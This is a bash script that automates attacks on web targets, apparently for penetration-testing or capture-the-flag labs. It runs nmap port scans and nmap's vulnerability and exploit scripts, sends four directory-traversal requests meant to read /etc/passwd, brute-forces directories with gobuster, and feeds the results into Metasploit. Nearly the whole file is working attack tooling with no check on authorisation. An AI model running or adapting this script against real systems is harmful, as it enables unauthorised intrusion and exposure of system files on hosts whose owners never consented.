#!/bin/bash
msfdb init &
sleep 10
if [ -f domain_names ]; then
	for i in $(cat domain_names); do
		export host4ip=$(curl -i http://$i | grep Location | awk -F "http://" '{print $2}')
		echo "$i   $host4ip" >> /etc/hosts 
		(nmap -p- -T4 $i -vvv -oA basicScan_$i | grep "Discovered open port" | grep -oP '\d+(?=/tcp)' | paste -sd,) > open_ports.md && \
		grep -q '[0-9]' open_ports.md && \
		nmap -A -p$(cat open_ports.md) $i --script=VULN,DISCOVERY,EXPLOIT -vv -oA advancedScan_$i && \
		curl -s http://$host4ip/robots.txt -o robotsfile$host4ip.md  && \ 
		curl -s http://$host4ip/?page=../../../../../../../etc/passwd -L -o dirtraversefirsttry$host4ip.md && \
		curl -s http://$host4ip/?id=../../../../../../../etc/passwd -L -o dirtraversesecondtry$host4ip.md && \
		curl -s http://$host4ip/?p=../../../../../../../etc/passwd -L -o dirtraversethirdtry$host4ip.md && \
		curl -s http://$host4ip/../../../../../../../etc/passwd -L -o dirtraversefourthtry$host4ip.md && \
		gobuster dir -u http://$host4ip -r -b 401,402,403,404,405 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -o "${i}_go_bust.txt" ;
		wait && msfconsole -r dbimporter.rc
	done;
else
	read -p "What is the Target's IP address? " Target
	export host4ip=$(curl -i http://$Target | grep Location | awk -F "http://" '{print $2}')
	echo "$Target   $host4ip" >> /etc/hosts
	(nmap -p- -T4 $Target -vv -oA basicScan_$Target | grep "Discovered open port" | grep -oP '\d+(?=/tcp)' | paste -sd,) > open_ports.md
	grep -q '[0-9]' open_ports.md 
        curl -s http://$Target/robots.txt -L -o robotsfile$Target.md  && \ 
        curl -s http://$Target/?page=../../../../../../../etc/passwd -L -o dirtraversefirsttry$Target.md && \
        curl -s http://$Target/?id=../../../../../../../etc/passwd -L -o dirtraversesecondtry$Target.md && \
        curl -s http://$Target/?p=../../../../../../../etc/passwd -L -o dirtraversethirdtry$Target.md && \
        curl -s http://$Target/../../../../../../../etc/passwd -L -o dirtraversefourthtry$Target.md
	nmap -A -p$(cat open_ports.md) $Target --script=VULN,DISCOVERY,EXPLOIT -vv -oA advancedScan_$Target
	gobuster dir -u http://$host4ip -r -b 401,402,403,404,405 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -o "${Target}_go_bust.txt"
	wait && msfconsole -r dbimporter.rc
fi
